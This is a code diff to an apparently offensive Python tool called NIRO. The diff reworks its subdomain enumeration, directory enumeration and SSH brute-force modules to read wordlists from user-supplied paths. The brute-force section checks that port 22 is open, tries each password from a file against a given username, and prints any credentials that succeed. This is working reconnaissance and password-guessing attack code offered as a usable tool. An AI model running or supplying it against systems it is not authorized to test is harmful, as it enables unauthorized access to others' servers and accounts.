@@ -28,10 +28,9 @@ print("[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")
 s = pyfiglet.figlet_format("SUB-DOMAIN")
 print(s)
 
-
-sub_list = open("subdomains.txt").read()
-
-subdoms = sub_list.splitlines()
+sub_file = input("[+] Enter subdomains file location : ")
+sub_list = open(str(sub_file),'r')
+subdoms = sub_list.readlines()
 
 for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}"
@@ -50,8 +49,10 @@ print("[*-*] Starting NIRO in DIRECTORY enumeration mode ...")
 d = pyfiglet.figlet_format("DIRECTORY")
 print(d)
 
-file = open("directory-list-2.3-medium.txt").read()
-directory_name = file.splitlines()
+dir_file = input("[+] Enter directory name file location : ")
+
+directory = open(str(dir_file),'r')
+directory_name = directory.readlines()
 
 for dir in directory_name :
    dir_enum = f"http://{sys.argv[1]}/{dir}"
@@ -105,7 +106,7 @@ b = pyfiglet.figlet_format("SSH BruteForce")
 print(b)
 
 username = str(input("[+] Enter Username : "))
-password_file = str(input("[+] Enter password file location : "))
+password_file = input("[+] Enter password file location : ")
 
 
 def ssh_connect(password, code=0):
@@ -120,23 +121,28 @@ def ssh_connect(password, code=0):
     return code
 
 if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
-        with open(password_file , 'r') as file:
-            for line in file.readlines():
-                password = line.strip()
+        print(" -----------------------")
+        print("|   TCP PORT 22 OPEN    |")
+        print(" -----------------------")
+        ssh_file = open(str(password_file), 'r')
+        ssh_line = ssh_file.readlines()   
+        for password in ssh_line:
 
                 try :
                     res = ssh_connect(password)
                     if (res==0) :
                         print("[OK] Password found: "+ password)
+                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
+                        print("username : " +username)
+                        print("Password : "+ password)
+                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                         exit(0)
                     elif res == 1:
                         print("[NO] No luck")
                 except Exception as e :
                         print(e)
                         pass
-
-        input_file.close()
-    else:
+else:
         print("(-_-) PORT 22 CLOSED...")
 
 print("---------------END OF SSH BruteForce-----------------")
